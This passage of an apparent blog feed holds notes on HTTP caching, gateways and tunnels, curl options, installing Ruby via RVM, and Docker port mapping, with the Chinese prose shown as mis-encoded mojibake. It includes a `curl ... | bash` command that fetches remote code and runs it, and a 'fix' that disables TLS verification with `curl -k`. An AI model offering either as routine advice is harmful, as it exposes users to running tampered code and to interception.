href="#7-6-3-ä»£ç†ç¼“å­˜çš„å±‚æ¬¡ç»“æ„" class="headerlink" title="7.6.3 ä»£ç†ç¼“å­˜çš„å±‚æ¬¡ç»“æ„"></a>7.6.3 ä»£ç†ç¼“å­˜çš„å±‚æ¬¡ç»“æ„</h4><p><img src="/../img/%E7%BC%93%E5%AD%98%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84.png" alt="ç¼“å­˜å±‚æ¬¡ç»“æ„"></p><h4 id="7-6-4-ç½‘çŠ¶ç¼“å­˜-x2F-å†…å®¹è·¯ç”±ä»¥åŠå¯¹ç­‰ç¼“å­˜"><a href="#7-6-4-ç½‘çŠ¶ç¼“å­˜-x2F-å†…å®¹è·¯ç”±ä»¥åŠå¯¹ç­‰ç¼“å­˜" class="headerlink" title="7.6.4 ç½‘çŠ¶ç¼“å­˜&#x2F;å†…å®¹è·¯ç”±ä»¥åŠå¯¹ç­‰ç¼“å­˜"></a>7.6.4 ç½‘çŠ¶ç¼“å­˜&#x2F;å†…å®¹è·¯ç”±ä»¥åŠå¯¹ç­‰ç¼“å­˜</h4><p>æœ‰äº›ç½‘ç»œç»“æ„ä¼šæ„å»ºå¤æ‚çš„<mark>ç½‘çŠ¶ç¼“å­˜</mark> (cache mesh).</p><p>ä¸€ç§ä»£ç†ç¼“å­˜ä¼šå†³å®šé€‰æ‹©ä½•ç§è·¯ç”±å¯¹å†…å®¹è¿›è¡Œè®¿é—®ã€ç®¡ç†å’Œä¼ é€ï¼Œå› æ­¤å¯å°†å…¶ç§°ä¸º<mark>å†…å®¹è·¯ç”±</mark> (content router).</p><p>ç¼“å­˜ä¹‹é—´è¿™äº›æ›´ä¸ºå¤æ‚çš„å…³ç³»å…è®¸ä¸åŒçš„ç»„ç»‡äº’ä¸ºå¯¹ç­‰ (peer) å®ä½“ï¼Œå°†å®ƒä»¬çš„ç¼“å­˜è¿æ¥èµ·æ¥ä»¥å®ç°å…±èµ¢ã€‚</p><p>æä¾›å¯é€‰çš„å¯¹ç­‰æ”¯æŒçš„ç¼“å­˜è¢«ç§°ä¸º<mark>å…„å¼Ÿç¼“å­˜</mark> (sibling cache).</p><h3 id="7-7-ç¼“å­˜çš„å¤„ç†æ­¥éª¤"><a href="#7-7-ç¼“å­˜çš„å¤„ç†æ­¥éª¤" class="headerlink" title="7.7 ç¼“å­˜çš„å¤„ç†æ­¥éª¤"></a>7.7 ç¼“å­˜çš„å¤„ç†æ­¥éª¤</h3><p>å¯¹ä¸€æ¡ HTTP GET æŠ¥æ–‡çš„åŸºæœ¬ç¼“å­˜å¤„ç†è¿‡ç¨‹åŒ…æ‹¬7ä¸ªæ­¥éª¤:</p><ol><li>æ¥å—</li><li>è§£æ</li><li>æŸ¥è¯¢</li><li>æ–°é²œåº¦æ£€æµ‹</li><li>åˆ›å»ºå“åº”</li><li>å‘é€</li><li>æ—¥å¿—</li></ol><p><img src="/../img/%E5%A4%84%E7%90%86%E4%B8%80%E4%B8%AA%E6%96%B0%E9%B2%9C%E7%9A%84%E7%BC%93%E5%AD%98%E5%91%BD%E4%B8%AD.png" alt="å¤„ç†ä¸€ä¸ªæ–°é²œçš„ç¼“å­˜å‘½ä¸­"></p><h3 id="7-8-ä¿æŒå‰¯æœ¬çš„æ–°é²œ"><a href="#7-8-ä¿æŒå‰¯æœ¬çš„æ–°é²œ" class="headerlink" title="7.8 ä¿æŒå‰¯æœ¬çš„æ–°é²œ"></a>7.8 ä¿æŒå‰¯æœ¬çš„æ–°é²œ</h3><h4 id="7-8-1-æ–‡æ¡£è¿‡æœŸ"><a href="#7-8-1-æ–‡æ¡£è¿‡æœŸ" class="headerlink" title="7.8.1 æ–‡æ¡£è¿‡æœŸ"></a>7.8.1 æ–‡æ¡£è¿‡æœŸ</h4><p>é€šè¿‡ç‰¹æ®Šçš„ HTTP Cache-Control é¦–éƒ¨å’Œ Expires é¦–éƒ¨ï¼ŒHTTP è®©åŸå§‹æœåŠ¡å™¨å‘æ¯ä¸ªæ–‡æ¡£é™„åŠ äº†ä¸€ä¸ª â€œè¿‡æœŸæ—¥æœŸâ€. è¿™äº›é¦–éƒ¨è¯´æ˜äº†åœ¨å¤šé•¿æ—¶é—´å†…å¯ä»¥å°†è¿™äº›å†…å®¹è§†ä¸ºæ–°é²œçš„ã€‚</p><p>åœ¨ç¼“å­˜æ–‡æ¡£è¿‡æœŸä¹‹å‰ï¼Œç¼“å­˜å¯ä»¥ä»¥ä»»æ„é¢‘ç‡ä½¿ç”¨è¿™äº›å‰¯æœ¬ï¼Œè€Œæ— éœ€ä¸æœåŠ¡å™¨è”ç³».</p><h4 id="7-8-2-è¿‡æœŸæ—¥æœŸå’Œä½¿ç”¨æœŸ"><a href="#7-8-2-è¿‡æœŸæ—¥æœŸå’Œä½¿ç”¨æœŸ" class="headerlink" title="7.8.2 è¿‡æœŸæ—¥æœŸå’Œä½¿ç”¨æœŸ"></a>7.8.2 è¿‡æœŸæ—¥æœŸå’Œä½¿ç”¨æœŸ</h4><p>Expires é¦–éƒ¨ä½¿ç”¨ç»å¯¹æ—¥æœŸ.</p><p>Cache-Control: max-age é¦–éƒ¨ä½¿ç”¨ç›¸å¯¹æ—¶é—´ (ä»¥ç§’ä¸ºå•ä½).</p><h4 id="7-8-3-æœåŠ¡å™¨å†éªŒè¯"><a href="#7-8-3-æœåŠ¡å™¨å†éªŒè¯" class="headerlink" title="7.8.3 æœåŠ¡å™¨å†éªŒè¯"></a>7.8.3 æœåŠ¡å™¨å†éªŒè¯</h4><p>å·²ç¼“å­˜æ–‡æ¡£è¿‡æœŸæ„å‘³ç€åˆ°äº†è¦å’ŒæœåŠ¡å™¨è¿›è¡Œæ ¸å¯¹çš„æ—¶é—´ï¼Œè¿™ç§æƒ…å†µè¢«ç§°ä¸º <mark>â€œæœåŠ¡å™¨å†éªŒè¯â€</mark>.</p><h4 id="7-8-4-ç”¨æ¡ä»¶æ–¹æ³•è¿›è¡Œå†éªŒè¯"><a href="#7-8-4-ç”¨æ¡ä»¶æ–¹æ³•è¿›è¡Œå†éªŒè¯" class="headerlink" title="7.8.4 ç”¨æ¡ä»¶æ–¹æ³•è¿›è¡Œå†éªŒè¯"></a>7.8.4 ç”¨æ¡ä»¶æ–¹æ³•è¿›è¡Œå†éªŒè¯</h4><p>HTTP å…è®¸ç¼“å­˜å‘åŸå§‹æœåŠ¡å™¨å‘é€ä¸€ä¸ª â€œæ¡ä»¶ GETâ€ , è¯·æ±‚æœåŠ¡å™¨åªæœ‰åœ¨æ–‡æ¡£ä¸ç¼“å­˜ä¸­ç°æœ‰çš„å‰¯æœ¬ä¸åŒæ—¶ï¼Œæ‰å›é€å¯¹è±¡ä¸»ä½“.</p><p>HTTP å®šä¹‰äº† 5 ä¸ªæ¡ä»¶è¯·æ±‚é¦–éƒ¨,å¯¹ç¼“å­˜å†éªŒè¯æ¥è¯´æœ€æœ‰ç”¨çš„ 2 ä¸ªé¦–éƒ¨æ˜¯:</p><ul><li>If-Modified-Since</li><li>If-None-Match</li></ul><p>æ‰€æœ‰çš„æ¡ä»¶é¦–éƒ¨éƒ½ä»¥å‰ç¼€ â€œIf-â€œ å¼€å¤´.j w</p><h4 id="7-8-7-å¼ºå¼±éªŒè¯å™¨"><a href="#7-8-7-å¼ºå¼±éªŒè¯å™¨" class="headerlink" title="7.8.7 å¼ºå¼±éªŒè¯å™¨"></a>7.8.7 å¼ºå¼±éªŒè¯å™¨</h4><p>å®ä½“æ ‡ç­¾å’Œæœ€è¿‘ä¿®æ”¹æ—¥æœŸéƒ½æ˜¯<mark>ç¼“å­˜éªŒè¯å™¨</mark> (cache validator).</p><p>å¼±éªŒè¯å™¨å…è®¸å¯¹ä¸€äº›å†…å®¹è¿›è¡Œä¿®æ”¹.</p><h4 id="7-8-8-ä»€ä¹ˆæ—¶å€™ä½¿ç”¨å®ä½“æ ‡ç­¾å’Œæœ€è¿‘ä¿®æ”¹æ—¥æœŸ"><a href="#7-8-8-ä»€ä¹ˆæ—¶å€™ä½¿ç”¨å®ä½“æ ‡ç­¾å’Œæœ€è¿‘ä¿®æ”¹æ—¥æœŸ" class="headerlink" title="7.8.8 ä»€ä¹ˆæ—¶å€™ä½¿ç”¨å®ä½“æ ‡ç­¾å’Œæœ€è¿‘ä¿®æ”¹æ—¥æœŸ"></a>7.8.8 ä»€ä¹ˆæ—¶å€™ä½¿ç”¨å®ä½“æ ‡ç­¾å’Œæœ€è¿‘ä¿®æ”¹æ—¥æœŸ</h4><h3 id="7-9-æ§åˆ¶ç¼“å­˜çš„èƒ½åŠ›"><a href="#7-9-æ§åˆ¶ç¼“å­˜çš„èƒ½åŠ›" class="headerlink" title="7.9 æ§åˆ¶ç¼“å­˜çš„èƒ½åŠ›"></a>7.9 æ§åˆ¶ç¼“å­˜çš„èƒ½åŠ›</h3><h2 id="ç¬¬8ç« -é›†æˆç‚¹-ç½‘å…³ã€éš§é“åŠä¸­ç»§"><a href="#ç¬¬8ç« -é›†æˆç‚¹-ç½‘å…³ã€éš§é“åŠä¸­ç»§" class="headerlink" title="ç¬¬8ç«  é›†æˆç‚¹: ç½‘å…³ã€éš§é“åŠä¸­ç»§"></a>ç¬¬8ç«  é›†æˆç‚¹: ç½‘å…³ã€éš§é“åŠä¸­ç»§</h2><h3 id="8-1-ç½‘å…³"><a href="#8-1-ç½‘å…³" class="headerlink" title="8.1 ç½‘å…³"></a>8.1 ç½‘å…³</h3><p>ç½‘å…³ (gateway) å¯ä»¥ä½œä¸ºæŸç§ç¿»è¯‘å™¨ä½¿ç”¨ã€‚</p><p>æœ‰äº›ç½‘å…³ä¼šè‡ªåŠ¨å°† HTTP æµé‡è½¬æ¢ä¸ºå…¶ä»–åè®®ï¼Œè¿™æ · HTTP å®¢æˆ·ç«¯æ— éœ€äº†è§£å…¶ä»–åè®®ï¼Œå°±å¯ä»¥ä¸å…¶ä»–åº”ç”¨ç¨‹åºè¿›è¡Œäº¤äº’äº†ã€‚</p><h4 id="å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯ç½‘å…³"><a href="#å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯ç½‘å…³" class="headerlink" title="å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯ç½‘å…³"></a>å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯ç½‘å…³</h4><p>Web ç½‘å…³åœ¨ä¸€ä¾§ä½¿ç”¨ HTTP åè®®ï¼Œåœ¨å¦ä¸€ä¾§ä½¿ç”¨å¦ä¸€ç§åè®®.</p><p>å¯ä»¥ç”¨ä¸€ä¸ªæ–œæ æ¥åˆ†éš”å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯åè®®ï¼Œå¹¶ä»¥æ­¤å¯¹ç½‘å…³è¿›è¡Œæè¿°:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">å®¢æˆ·ç«¯åè®®</span>&gt;</span>/<span class="hljs-tag">&lt;<span class="hljs-name">æœåŠ¡å™¨ç«¯åè®®</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="8-2-åè®®ç½‘å…³"><a href="#8-2-åè®®ç½‘å…³" class="headerlink" title="8.2 åè®®ç½‘å…³"></a>8.2 åè®®ç½‘å…³</h3><p>å°† HTTP æµé‡å¯¼å‘ç½‘å…³æ—¶æ‰€ä½¿ç”¨çš„çš„æ–¹å¼ä¸æµé‡å¯¼å‘ä»£ç†çš„æ–¹å¼ç›¸åŒã€‚</p><h4 id="8-2-1-HTTP-x2F-æœåŠ¡å™¨ç«¯-Web-ç½‘å…³"><a href="#8-2-1-HTTP-x2F-æœåŠ¡å™¨ç«¯-Web-ç½‘å…³" class="headerlink" title="8.2.1 HTTP&#x2F;*: æœåŠ¡å™¨ç«¯ Web ç½‘å…³"></a>8.2.1 HTTP&#x2F;*: æœåŠ¡å™¨ç«¯ Web ç½‘å…³</h4><p>è¯·æ±‚æµå…¥åŸå§‹æœåŠ¡å™¨æ—¶ï¼ŒæœåŠ¡å™¨ç«¯ Web ç½‘å…³ä¼šå°†å®¢æˆ·ç«¯ HTTP è¯·æ±‚è½¬æ¢ä¸ºå…¶ä»–åè®®.</p><h4 id="8-2-2-HTTP-x2F-HTTPS-æœåŠ¡å™¨ç«¯å®‰å…¨ç½‘å…³"><a href="#8-2-2-HTTP-x2F-HTTPS-æœåŠ¡å™¨ç«¯å®‰å…¨ç½‘å…³" class="headerlink" title="8.2.2 HTTP&#x2F;HTTPS: æœåŠ¡å™¨ç«¯å®‰å…¨ç½‘å…³"></a>8.2.2 HTTP&#x2F;HTTPS: æœåŠ¡å™¨ç«¯å®‰å…¨ç½‘å…³</h4><p>ä¸€ä¸ªç»„ç»‡å¯ä»¥é€šè¿‡ç½‘å…³å¯¹æ‰€æœ‰è¾“å…¥ Web çš„è¯·æ±‚åŠ å¯†ï¼Œä»¥æä¾›é¢å¤–çš„éšç§å’Œå®‰å…¨æ€§ä¿æŠ¤.</p><h4 id="8-2-3-HTTPS-x2F-HTTP-å®¢æˆ·ç«¯å®‰å…¨åŠ é€Ÿå™¨ç½‘å…³"><a href="#8-2-3-HTTPS-x2F-HTTP-å®¢æˆ·ç«¯å®‰å…¨åŠ é€Ÿå™¨ç½‘å…³" class="headerlink" title="8.2.3 HTTPS&#x2F;HTTP å®¢æˆ·ç«¯å®‰å…¨åŠ é€Ÿå™¨ç½‘å…³"></a>8.2.3 HTTPS&#x2F;HTTP å®¢æˆ·ç«¯å®‰å…¨åŠ é€Ÿå™¨ç½‘å…³</h4><p>å®ƒä»¬æ¥å—å®‰å…¨çš„ HTTPS æµé‡,å¯¹å®‰å…¨æµé‡è¿›è¡Œè§£å¯†,å¹¶å‘ Web æœåŠ¡å™¨å‘é€æ™®é€šçš„ HTTP è¯·æ±‚.</p><p>è¿™äº›ç½‘å…³ä¸­é€šå¸¸åŒ…å«ä¸“ç”¨çš„è§£å¯†ç¡¬ä»¶.</p><h3 id="8-3-èµ„æºç½‘å…³"><a href="#8-3-èµ„æºç½‘å…³" class="headerlink" title="8.3 èµ„æºç½‘å…³"></a>8.3 èµ„æºç½‘å…³</h3><p>æœ€å¸¸è§çš„ç½‘å…³, åº”ç”¨ç¨‹åºæœåŠ¡å™¨, ä¼šå°†ç›®æ ‡æœåŠ¡å™¨ä¸ç½‘å…³ç»“åˆåœ¨ä¸€ä¸ªæœåŠ¡å™¨ä¸­å®ç°.</p><p>CGI (Common Gateway Interface), é€šç”¨ç½‘å…³æ¥å£, å…¶ä¸ºä¸€ä¸ªæ ‡å‡†æ¥å£é›†, Web æœåŠ¡å™¨å¯ä»¥ç”¨å®ƒæ¥è£…è½½ç¨‹åºä»¥å“åº”å¯¹ç‰¹å®š URL çš„ HTTP è¯·æ±‚,å¹¶æ”¶é›†ç¨‹åºçš„è¾“å‡ºæ•°æ®,å°†å…¶æ”¾åœ¨ HTTP å“åº”ä¸­å›é€.</p><p>æœåŠ¡å™¨å’Œç½‘å…³æ˜¯ç›¸äº’ç‹¬ç«‹çš„åº”ç”¨ç¨‹åº.</p><h4 id="8-3-1-CGI"><a href="#8-3-1-CGI" class="headerlink" title="8.3.1 CGI"></a>8.3.1 CGI</h4><p>CGI åº”ç”¨ç¨‹åºæ˜¯ç‹¬ç«‹äºæœåŠ¡å™¨çš„,å‡ ä¹å¯ä»¥ç”¨ä»»æ„è¯­è¨€æ¥å®ç°.</p><p>CGI å¾ˆç®€å•, å‡ ä¹æ‰€æœ‰çš„ HTTP æœåŠ¡å™¨éƒ½æ”¯æŒå®ƒ.</p><p>CGI åº”ç”¨ç¨‹åºå¯¹ç”¨æˆ·æ¥è¯´æ˜¯ä¸å¯è§çš„.</p><h4 id="8-3-2-æœåŠ¡å™¨æ‰©å±•-API"><a href="#8-3-2-æœåŠ¡å™¨æ‰©å±•-API" class="headerlink" title="8.3.2 æœåŠ¡å™¨æ‰©å±• API"></a>8.3.2 æœåŠ¡å™¨æ‰©å±• API</h4><p>CGI åè®®ä¸ºå¤–éƒ¨ç¿»è¯‘å™¨ä¸ç°æœ‰çš„ HTTP æœåŠ¡æä¾›äº†ä¸€ç§ç®€æ´çš„æ¥å£æ–¹å¼.</p><p>æ‰©å±• API å…è®¸ç¨‹åºå‘˜å°†è‡ªå·±çš„ä»£ç å«æ¥åˆ°æœåŠ¡å™¨ä¸Š,æˆ–è€…ç”¨è‡ªå·±çš„ä»£ç å°†æœåŠ¡å™¨çš„ä¸€ä¸ªç»„ä»¶å®Œæ•´åœ°æ›¿æ¢å‡ºæ¥.</p><h3 id="8-4-åº”ç”¨ç¨‹åºæ¥å£å’Œ-Web-æœåŠ¡å™¨"><a href="#8-4-åº”ç”¨ç¨‹åºæ¥å£å’Œ-Web-æœåŠ¡å™¨" class="headerlink" title="8.4 åº”ç”¨ç¨‹åºæ¥å£å’Œ Web æœåŠ¡å™¨"></a>8.4 åº”ç”¨ç¨‹åºæ¥å£å’Œ Web æœåŠ¡å™¨</h3><p>HTTP å¯ä»¥ä½œä¸ºä¸€ç§è¿æ¥åº”ç”¨ç¨‹åºçš„åŸºç¡€è½¯ä»¶æ¥ä½¿ç”¨.</p><p>åº”ç”¨ç¨‹åºä¹‹é—´è¦é…åˆå·¥ä½œï¼Œæ‰€è¦äº¤äº’çš„ä¿¡æ¯æ¯” HTTP é¦–éƒ¨æ‰€èƒ½è¡¨è¾¾çš„ä¿¡æ¯è¦å¤æ‚å¾—å¤šã€‚</p><h3 id="8-5-éš§é“"><a href="#8-5-éš§é“" class="headerlink" title="8.5 éš§é“"></a>8.5 éš§é“</h3><p>HTTP çš„å¦ä¸€ç§ç”¨æ³• â€“ Web éš§é“ (Web tunnel), è¿™ç§æ–¹å¼å¯ä»¥é€šè¿‡ HTTP åº”ç”¨ç¨‹åºè®¿é—®ä½¿ç”¨é HTTP åè®®çš„åº”ç”¨ç¨‹åºã€‚</p><p>Web éš§é“å…è®¸ç”¨æˆ·é€šè¿‡ HTTP é“¾æ¥å‘é€é HTTP æµé‡.</p><p>ä½¿ç”¨ Web éš§é“æœ€å¸¸è§çš„åŸå› å°±æ˜¯è¦åœ¨ HTTP è¿æ¥ä¸­åµŒå…¥é HTTP æµé‡ï¼Œè¿™æ ·ï¼Œè¿™ç±»æµé‡å°±å¯ä»¥ç©¿è¿‡åªå…è®¸ Web æµé‡é€šè¿‡çš„é˜²ç«å¢™äº†.</p><h4 id="8-5-1-ç”¨-CONNECT-å»ºç«‹-HTTP-éš§é“"><a href="#8-5-1-ç”¨-CONNECT-å»ºç«‹-HTTP-éš§é“" class="headerlink" title="8.5.1 ç”¨ CONNECT å»ºç«‹ HTTP éš§é“"></a>8.5.1 ç”¨ CONNECT å»ºç«‹ HTTP éš§é“</h4>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python åº“ shadowsocks ä½¿ç”¨</title>
    <link href="/2022/08/29/Python-%E5%BA%93-shadowsocks-%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/08/29/Python-%E5%BA%93-shadowsocks-%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>curl å‘½ä»¤ç¬”è®°</title>
    <link href="/2022/08/29/curl-%E5%91%BD%E4%BB%A4%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/08/29/curl-%E5%91%BD%E4%BB%A4%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p><a href="https://curl.se/">å®˜ç½‘</a></p><h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><p>curl å…¨ç§°ä¸º CommandLine Uniform Resource Locator, å³ CommandLine url. å¯ç”¨äºæ•°æ®å’Œæ–‡ä»¶çš„ä¼ è¾“ã€‚</p><h1 id="ç”¨æ³•"><a href="#ç”¨æ³•" class="headerlink" title="ç”¨æ³•"></a>ç”¨æ³•</h1><p>ä¸€èˆ¬è¯­æ³•ä¸º:</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">$ curl <span class="hljs-comment">[-å‚æ•°]</span> <span class="hljs-comment">[URL]</span><br></code></pre></td></tr></table></figure><h2 id="è·å–ä¸€ä¸ªç•Œé¢"><a href="#è·å–ä¸€ä¸ªç•Œé¢" class="headerlink" title="è·å–ä¸€ä¸ªç•Œé¢"></a>è·å–ä¸€ä¸ªç•Œé¢</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> www.baidu.com<br></code></pre></td></tr></table></figure><p>æœªæŒ‡å®šæ‰€ç”¨åè®®ï¼Œcurl ä¼šæ™ºèƒ½é€‰æ‹©ã€‚å…¶è¿”å›é¡µé¢çš„ HTML ä»£ç ã€‚</p><h2 id="å¸¸ç”¨é€‰é¡¹"><a href="#å¸¸ç”¨é€‰é¡¹" class="headerlink" title="å¸¸ç”¨é€‰é¡¹"></a>å¸¸ç”¨é€‰é¡¹</h2><h3 id="v-â€“verbose"><a href="#v-â€“verbose" class="headerlink" title="-v â€“verbose"></a>-v â€“verbose</h3><p>ç”¨äºè·Ÿè¸ª url çš„è¿æ¥ä¿¡æ¯ã€‚</p><p>è¿”å›çš„ä¿¡æ¯åŒ…å«: åŸŸåè§£é‡Šè¿‡ç¨‹ï¼Œè¯·æ±‚å¤´ä¿¡æ¯ (request)ï¼Œå›åº”å¤´ä¿¡æ¯ (response) ç­‰.</p><h3 id="i-â€“include"><a href="#i-â€“include" class="headerlink" title="-i â€“include"></a>-i â€“include</h3><p>å’Œ <code>-v</code> é€‰é¡¹ç±»ä¼¼ï¼Œæ˜¯å…¶å­é›†ã€‚åœ¨è¾“å‡ºä¿¡æ¯ä¸­åŒ…å« HTTP å¤´ä¿¡æ¯ã€‚</p><h3 id="I-â€“head"><a href="#I-â€“head" class="headerlink" title="-I â€“head"></a>-I â€“head</h3><p>å’Œ <code>-v</code> é€‰é¡¹ç±»ä¼¼ï¼Œæ˜¯å…¶å­é›†ã€‚åªæ˜¾ç¤ºè¿”å›çš„å¤´ä¿¡æ¯ã€‚</p><h3 id="u-â€“user"><a href="#u-â€“user" class="headerlink" title="-u â€“user"></a>-u â€“user</h3><p>å¸¦ç”¨æˆ·éªŒè¯çš„è¿æ¥.</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ curl -u username:password https:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/<br></code></pre></td></tr></table></figure><h3 id="d-â€“data"><a href="#d-â€“data" class="headerlink" title="-d â€“data"></a>-d â€“data</h3><p>å¸¦è¯·æ±‚å‚æ•°çš„è¿æ¥:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ curl -d <span class="hljs-string">&#x27;user=xiaoruan&amp;age=22&#x27;</span> http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/index.html<br></code></pre></td></tr></table></figure><p>å®é™…ä¸º <code>http://127.0.0.1/index.html?user=xiaoruan&amp;age=22</code></p><h3 id="X-â€“request"><a href="#X-â€“request" class="headerlink" title="-X â€“request"></a>-X â€“request</h3><p>æŒ‡å®šè¯·æ±‚æ–¹å¼:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> <span class="hljs-literal">-XGET</span> www.baidu.com<br><span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> <span class="hljs-literal">-XPOST</span> www.baidu.com<br></code></pre></td></tr></table></figure><h3 id="H-â€“header"><a href="#H-â€“header" class="headerlink" title="-H â€“header"></a>-H â€“header</h3><p>è‡ªå®šä¹‰è¯·æ±‚å¤´:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -i -H <span class="hljs-string">&#x27;ACCEPT: application/json&#x27;</span> -d <span class="hljs-string">&#x27;name=Foo&amp;status=Bar&#x27;</span> http://localhost:49160/json</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æŒ‡å®šç‰ˆæœ¬ å®‰è£… Ruby</title>
    <link href="/2022/08/29/%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC-%E5%AE%89%E8%A3%85-Ruby/"/>
    <url>/2022/08/29/%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC-%E5%AE%89%E8%A3%85-Ruby/</url>
    
    <content type="html"><![CDATA[<p>é€šè¿‡ <code>RVM</code> å®‰è£…ï¼ŒRVM å³ Ruby Version Manager, æ˜¯ Ruby ç‰ˆæœ¬åŠå®‰è£…å·¥å…·ã€‚</p><p>å®‰è£… rvm:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ curl -L https:<span class="hljs-regexp">//g</span>et.rvm.io | bash -s stable<br></code></pre></td></tr></table></figure><p>éªŒè¯ rvm æ˜¯å¦å®‰è£…æ­£ç¡®:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>rvm -v<br></code></pre></td></tr></table></figure><p>å®‰è£…æŒ‡å®šç‰ˆæœ¬çš„ Ruby:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">$ rvm <span class="hljs-keyword">install</span> <span class="hljs-number">2.0</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>rvm list<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è§£å†³ curl: (60) ssl certificate problem certificate has expired é—®é¢˜</title>
    <link href="/2022/08/29/%E8%A7%A3%E5%86%B3-curl-60-ssl-certificate-problem-certificate-has-expired-%E9%97%AE%E9%A2%98/"/>
    <url>/2022/08/29/%E8%A7%A3%E5%86%B3-curl-60-ssl-certificate-problem-certificate-has-expired-%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>æ ¹æ®æŠ¥é”™æ·»åŠ  <code>-k</code> å‚æ•°å³å¯:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">curl -k</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Errors</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æœ¬æœºç«¯å£çš„ä½¿ç”¨</title>
    <link href="/2022/08/29/%E6%9C%AC%E6%9C%BA%E7%AB%AF%E5%8F%A3%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/08/29/%E6%9C%AC%E6%9C%BA%E7%AB%AF%E5%8F%A3%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>ä¾‹å¦‚åœ¨å®¹å™¨ä¸­å¯¹å¤–æ‰“å¼€ 80 ç«¯å£ï¼Œå…¶æ˜ å°„åˆ°å®¿ä¸»æœºçš„ 49153 ç«¯å£ï¼Œå³ <code>0.0.0.0:49153-&gt;80/tcp</code>ï¼Œé‚£ä¹ˆå¯ä»¥åœ¨æµè§ˆå™¨ä½¿ç”¨ <code>localhost:49153/</code> æ¥æ‰“å¼€ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è§£å†³åœ¨ Docker ä¸­æ¢æºå No system certificates available. Try installing ca-certificates é—®é¢˜</title>
    <link href="/2022/08/28/%E8%A7%A3%E5%86%B3%E5%9C%A8-Docker-%E4%B8%AD%E6%8D%A2%E6%BA%90%E5%90%8E-No-system-certificates-available-Try-installing-ca-certificates-%E9%97%AE%E9%A2%98/"/>
    <url>/2022/08/28/%E8%A7%A3%E5%86%B3%E5%9C%A8-Docker-%E4%B8%AD%E6%8D%A2%E6%BA%90%E5%90%8E-No-system-certificates-available-Try-installing-ca-certificates-%E9%97%AE%E9%A2%98/</url>
    
